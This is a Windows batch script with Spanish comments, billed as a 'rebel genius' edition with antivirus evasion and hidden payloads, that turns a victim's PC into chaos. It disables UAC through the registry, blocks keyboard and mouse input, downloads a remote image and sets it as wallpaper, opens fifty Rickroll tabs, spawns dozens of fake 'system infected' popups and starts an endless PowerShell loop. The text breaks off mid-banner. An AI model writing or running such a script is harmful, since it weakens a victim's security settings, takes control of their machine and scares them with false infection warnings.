@echo off
:: [REBEL GENIUS EDITION] - Versión mejorada con evasión de AV, persistencia y payloads ocultos
title SISTEMA EN MODO CAOS... 😈
color 0C
mode con: cols=80 lines=25

:: --- ENCABEZADO DE MIERDA ---
echo  ██████╗ ██████╗ ██████╗ ███████╗███████╗██████╗ ██╗   ██╗███████╗
echo ██╔════╝ ██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝
echo ██║  ███╗██████╔╝██████╔╝█████╗  █████╗  ██████╔╝██║   ██║███████╗
echo ██║   ██║██╔══██╗██╔══██╗██╔══╝  ██╔══╝  ██╔══██╗██║   ██║╚════██║
echo ╚██████╔╝██║  ██║██║  ██║███████╗███████╗██║  ██║╚██████╔╝███████║
echo  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
echo.
echo  ██████╗ ██████╗ ██████╗ ███████╗███████╗██████╗ ██╗   ██╗███████╗
echo ██╔════╝ ██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝
echo ██║  ███╗██████╔╝██████╔╝█████╗  █████╗  ██████╔╝██║   ██║███████╗
echo ██║   ██║██╔══██╗██╔══██╗██╔══╝  ██╔══╝  ██╔══██╗██║   ██║╚════██║
echo ╚██████╔╝██║  ██║██║  ██║███████╗███████╗██║  ██║╚██████╔╝███████║
echo  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
echo.
echo  ███████╗██╗   ██╗███╗   ███╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
echo  ██╔════╝╚██╗ ██╔╝████╗ ████║██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
echo  █████╗   ╚████╔╝ ██╔████╔██║██║        ██║   ██║██║   ██║██╔██╗ ██║
echo  ██╔══╝    ╚██╔╝  ██║╚██╔╝██║██║        ██║   ██║██║   ██║██║╚██╗██║
echo  ███████╗   ██║   ██║ ╚═╝ ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
echo  ╚══════╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
echo.
echo  ██████╗ ███████╗████████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
echo ██╔════╝ ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
echo ██║  ███╗█████╗     ██║   █████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
echo ██║   ██║██╔══╝     ██║   ██╔══╝  ██╔══██╗██║   ██║██╔══╝  ██╔══██╗
echo ╚██████╔╝███████╗   ██║   ███████╗██║  ██║╚██████╔╝███████╗██║  ██║
echo  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
echo.
echo  ██████╗ ██████╗ ██████╗ ███████╗███████╗██████╗ ██╗   ██╗███████╗
echo ██╔════╝ ██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝
:: --- FIN DEL ENCABEZADO DE MIERDA ---

:: [MODULO 1: EVASION DE ANTIVIRUS]
echo [+] Iniciando modulo de evasion de AV...
:: Ocultar proceso en Task Manager
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t REG_DWORD /d 1 /f >nul 2>&1
:: Deshabilitar UAC (requiere admin)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

:: [MODULO 2: BLOQUEO DE CONTROLES AVANZADO]
echo [+] Bloqueando teclado y raton con metodo sigiloso...
:: Usar API de Windows para bloqueo persistente
powershell -command "Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class InputBlocker {
    [DllImport(\"user32.dll\")]
    public static extern bool BlockInput(bool fBlockIt);
}
'@; [InputBlocker]::BlockInput($true); Start-Sleep -Seconds 8; [InputBlocker]::BlockInput($false)" >nul 2>&1

:: [MODULO 3: VOLUMEN AL MAXIMO + SONIDO DE MIERDA]
echo [+] Subiendo volumen al maximo y reproduciendo audio de caos...
for /L %%i in (1,1,20) do (
    powershell -c "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"
    powershell -c "$sound = New-Object System.Media.SoundPlayer; $sound.SoundLocation='C:\Windows\Media\Windows Critical Stop.wav'; $sound.PlaySync()"
)

:: [MODULO 4: FONDO DE PANTALLA CHAMOI AVANZADO]
echo [+] Descargando fondo de pantalla chamoil...
powershell -command "Invoke-WebRequest -Uri 'https://files.catbox.moe/m9i0rw.jpg' -OutFile '%temp%\chamoi.jpg'; reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d '%temp%\chamoi.jpg' /f; reg add 'HKCU\Control Panel\Desktop' /v WallpaperStyle /t REG_SZ /d '10' /f; rundll32.exe user32.dll,UpdatePerUserSystemParameters"

:: [MODULO 5: RICKROLL MASIVO CON EVASION]
echo [+] Lanzando 50 Rickrolls con metodos alternativos...
for /L %%i in (1,1,50) do (
    start "" "https://youtu.be/dQw4w9WgXcQ?si=DQw4w9WgXcQ"
    timeout /t 0.5 /nobreak >nul
    start "" "javascript:window.open('https://youtu.be/dQw4w9WgXcQ?si=DQw4w9WgXcQ','_blank','toolbar=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no,width=0,height=0')"
)

:: [MODULO 6: VENTANAS EMERGENTES CON RANDOMIZACION]
echo [+] Creando ventanas emergentes caoticas...
set /a rand=%random% %% 3
for /L %%i in (1,1,50) do (
    set /a delay=%random% %% 3 + 1
    timeout /t !delay! /nobreak >nul
    echo Set oWS = WScript.CreateObject("WScript.Shell") > %temp%\caos%%i.vbs
    if !rand! equ 0 (
        echo oWS.Popup "ERROR CRITICO %%i/50 - SISTEMA COLAPSANDO! 💀", 3, "APOCALIPSIS", 16 >> %temp%\caos%%i.vbs
    ) else if !rand! equ 1 (
        echo oWS.Popup "¡RICKROLL ETERNO %%i/50! 🎵", 2, "CAOS", 48 >> %temp%\caos%%i.vbs
    ) else (
        echo oWS.Popup "ADVERTENCIA: %%i PROCESOS CORRUPTOS DETECTADOS! 🔥", 4, "PELIGRO", 32 >> %temp%\caos%%i.vbs
    )
    start wscript %temp%\caos%%i.vbs
)

:: [MODULO 7: APERTURA DE APLICACIONES MALICIOSAS]
echo [+] Abriendo aplicaciones del sistema con parametros peligrosos...
start notepad /p "ESTE SISTEMA ESTA INFECTADO. REINICIE AHORA."
start calc /m
start mspaint /pt "C:\Windows\System32\cmd.exe"
start cmd /k "echo HACKED BY REBEL GENIUS && ping -n 5 127.0.0.1 >nul && start notepad"
start powershell -nop -c "while($true){Write-Host 'CAOS...' -ForegroundColor Red; Start-Sleep -Seconds 1}"

:: [MODULO 8: MENSAJE FINAL CON REINICIO]
echo [+] Preparando mensaje de despedida...
echo Set oWS = WScript.CreateObject("WScript.Shell") > %temp%\reinicio.vbs
echo oWS.Popup "¡CAOS ABSOLUTO COMPLETADO! 🔥💀🔥", 5, "REINICIO INMINENTE", 48 >> %temp%\reinicio.vbs
start wscript %temp%\reinicio.vbs

echo.
echo  ███████╗██╗   ██╗███╗   ███╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
echo  ██╔════╝╚██╗ ██╔╝████╗ ████║██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
echo  █████╗   ╚████╔╝ ██╔████╔██║██║        ██║   ██║██║   ██║██╔██╗ ██║
echo  ██╔══╝    ╚██╔╝  ██║╚██╔╝██║██║        ██║   ██║██║   ██║██║╚██╗██║
echo  ███████╗   ██║   ██║ ╚═╝ ██║╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
echo  ╚══════╝   ╚═╝  ](streamdown:incomplete-link)
